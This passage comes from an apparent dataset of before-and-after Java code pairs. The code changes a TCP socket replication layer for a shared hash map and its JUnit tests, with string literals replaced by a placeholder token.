        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}"
91391,"@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(500);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(500);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91392,"/** 
 * reads entries from the socket till it is empty
 * @param socketChannel
 * @throws IOException
 * @throws InterruptedException
 */
void readAll(@NotNull final SocketChannel socketChannel) throws IOException, InterruptedException {
  if (sizeOfNextEntry == Long.MIN_VALUE) {
    if (bytes.remaining() < 8) {
      socketChannel.read(byteBuffer);
      bytes.limit(byteBuffer.position());
      if (bytes.remaining() < 8)       return;
    }
    sizeOfNextEntry=bytes.readUnsignedShort();
  }
  if (sizeOfNextEntry <= 0)   throw new IllegalStateException(""String_Node_Str"" + sizeOfNextEntry);
  if (bytes.remaining() < sizeOfNextEntry) {
    socketChannel.read(byteBuffer);
    bytes.limit(byteBuffer.position());
    if (bytes.remaining() < sizeOfNextEntry)     return;
  }
  final long limit=bytes.position() + sizeOfNextEntry;
  bytes.limit(limit);
  externalizable.readExternalEntry(bytes);
  bytes.position(limit);
  if (byteBuffer.position() > 0 && byteBuffer.remaining() <= entrySize0) {
    byteBuffer.compact();
    bytes.position(0);
  }
  bytes.limit(byteBuffer.position());
  sizeOfNextEntry=Long.MIN_VALUE;
}","/** 
 * reads entries from the socket till it is empty
 * @param socketChannel
 * @throws IOException
 * @throws InterruptedException
 */
void readAll(@NotNull final SocketChannel socketChannel) throws IOException, InterruptedException {
  for (; ; ) {
    if (sizeOfNextEntry == Long.MIN_VALUE) {
      if (bytes.remaining() < 8) {
        socketChannel.read(byteBuffer);
        bytes.limit(byteBuffer.position());
        if (bytes.remaining() < 8)         return;
      }
      sizeOfNextEntry=bytes.readUnsignedShort();
    }
    if (sizeOfNextEntry <= 0)     throw new IllegalStateException(""String_Node_Str"" + sizeOfNextEntry);
    if (bytes.remaining() < sizeOfNextEntry) {
      socketChannel.read(byteBuffer);
      bytes.limit(byteBuffer.position());
      if (bytes.remaining() < sizeOfNextEntry)       return;
    }
    final long limit=bytes.position() + sizeOfNextEntry;
    bytes.limit(limit);
    externalizable.readExternalEntry(bytes);
    bytes.position(limit);
    if (byteBuffer.position() > 0 && byteBuffer.remaining() <= entrySize0) {
      byteBuffer.compact();
      bytes.position(0);
    }
    bytes.limit(byteBuffer.position());
    sizeOfNextEntry=Long.MIN_VALUE;
  }
}"
91393,"@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(500);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91394,"@Before public void setup() throws IOException {
  map1=newSocketShmIntString((byte)1,8076,new ClientPort(8077,""String_Node_Str""),new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map2=newSocketShmIntString((byte)2,8077,new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map3=newSocketShmIntString((byte)3,8078,new ClientPort(8079,""String_Node_Str""));
  map4=newSocketShmIntString((byte)4,8079);
}","@Before public void setup() throws IOException {
  map1=newSocketShmIntString((byte)1,8076,new ClientPort(8077,""String_Node_Str""),new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map2=newSocketShmIntString((byte)2,8077,new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map3=newSocketShmIntString((byte)3,8078,new ClientPort(8079,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""));
  map4=newSocketShmIntString((byte)4,8079,new ClientPort(8078,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""));
}"
91395,"@Test @Ignore public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map1.put(2,""String_Node_Str"");
  map1.put(3,""String_Node_Str"");
  map2.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map1.remove(2);
  map2.remove(3);
  map1.remove(3);
  map2.put(5,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map1.isEmpty());
}"
91396,"@Test public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    map1.put(i,""String_Node_Str"");
  }
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map2.isEmpty());
}","@Test @Ignore public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    map1.put(i,""String_Node_Str"");
  }
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map2.isEmpty());
}"
91397,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"",true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (!isClosed.get())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (!isClosed.get())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91398,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
    remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (!isClosed.get())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (!isClosed.get())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}"
91399,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}"
91400,"WelcomeMessage readWelcomeMessage(SocketChannel channel) throws IOException {
  byteBuffer.clear();
  bytes.limit(0);
  bytes.position(0);
  while (bytes.remaining() < 9) {
    channel.read(byteBuffer);
    bytes.limit(byteBuffer.position());
  }
  return new WelcomeMessage(bytes.readByte(),bytes.readLong());
}","Bootstrap readWelcomeMessage(SocketChannel channel) throws IOException {
  byteBuffer.clear();
  bytes.limit(0);
  bytes.position(0);
  while (bytes.remaining() < 9) {
    channel.read(byteBuffer);
    bytes.limit(byteBuffer.position());
  }
  return new Bootstrap(bytes.readByte(),bytes.readLong());
}"
91401,"public SocketChannelEntryReader(int entrySize,ReplicatedSharedHashMap.EntryExternalizable externalizable){
  this.entrySize0=entrySize + 128;
  byteBuffer=ByteBuffer.allocate(entrySize0 * MAX_NUMBER_OF_ENTRIES_PER_BUFFER);
  this.externalizable=externalizable;
  bytes=new ByteBufferBytes(byteBuffer);
  byteBuffer.clear();
  bytes.limit(0);
  bytes.position(0);
}","public SocketChannelEntryReader(int entrySize,ReplicatedSharedHashMap.EntryExternalizable externalizable){
  this.entrySize0=entrySize;
  byteBuffer=ByteBuffer.allocate(entrySize0 * MAX_NUMBER_OF_ENTRIES_PER_BUFFER);
  this.externalizable=externalizable;
  bytes=new ByteBufferBytes(byteBuffer);
  byteBuffer.clear();
  bytes.limit(0);
  bytes.position(0);
}"
91402,"/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  for (; ; ) {
    final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
    if (!wasDataRead && bytes.position() == 0)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == 0))     continue;
    bytes.flip();
    final ByteBuffer byteBuffer=bytes.buffer();
    byteBuffer.limit((int)bytes.limit());
    byteBuffer.position((int)bytes.position());
    socketChannel.write(byteBuffer);
    bytes.clear();
    byteBuffer.clear();
    return;
  }
}","/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  for (; ; ) {
    byteBuffer.limit(byteBuffer.capacity());
    boolean wasDataRead=false;
    try {
      wasDataRead=modificationIterator.nextEntry(entryCallback);
    }
 catch (    IndexOutOfBoundsException e) {
      e.printStackTrace();
      int i=1;
    }
    if (!wasDataRead && bytes.position() == 0)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == 0))     continue;
    byteBuffer.limit((int)bytes.position());
    socketChannel.write(byteBuffer);
    if (byteBuffer.remaining() == 0) {
      byteBuffer.position(0);
      byteBuffer.limit(0);
    }
 else {
      byteBuffer.compact();
      byteBuffer.flip();
    }
    bytes.position(byteBuffer.limit());
    bytes.limit(bytes.capacity());
    return;
  }
}"
91403,"public void sendWelcomeMessage(@NotNull final SocketChannel socketChannel,final long timeStampOfLastMessage,final int localIdentifier1) throws IOException {
  bytes.clear();
  byteBuffer.clear();
  bytes.writeByte(localIdentifier1);
  bytes.writeLong(timeStampOfLastMessage);
  byteBuffer.limit((int)bytes.position());
  socketChannel.write(byteBuffer);
  bytes.clear();
  byteBuffer.clear();
}","public void sendWelcomeMessage(@NotNull final SocketChannel socketChannel,final long timeStampOfLastMessage,final int localIdentifier1) throws IOException {
  bytes.clear();
  byteBuffer.clear();
  bytes.writeByte(localIdentifier1);
  bytes.writeLong(timeStampOfLastMessage);
  byteBuffer.limit((int)bytes.position());
  socketChannel.write(byteBuffer);
  if (byteBuffer.remaining() == 0) {
    byteBuffer.position(0);
    byteBuffer.limit(0);
  }
 else {
    byteBuffer.compact();
    byteBuffer.flip();
  }
  bytes.position(byteBuffer.limit());
  bytes.limit(bytes.capacity());
}"
91404,"static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize();
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(builder.entrySize(),result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}","static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize();
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(adjustedEntrySize,result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}"
91405,"@Before public void setup() throws IOException {
  map1=TCPSocketReplication4WayMapTest.newSocketShmIntString((byte)1,8076,new ClientTcpSocketReplicator.ClientPort(8077,""String_Node_Str""));
  map2=TCPSocketReplication4WayMapTest.newSocketShmIntString((byte)2,8077);
}","@Before public void setup() throws IOException {
  map1=TCPSocketReplication4WayMapTest.newSocketShmIntString((byte)1,8076);
  map2=TCPSocketReplication4WayMapTest.newSocketShmIntString((byte)2,8077,new ClientPort(8076,""String_Node_Str""));
}"
91406,"@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(1000);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.remove(3);
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.remove(3);
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91407,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
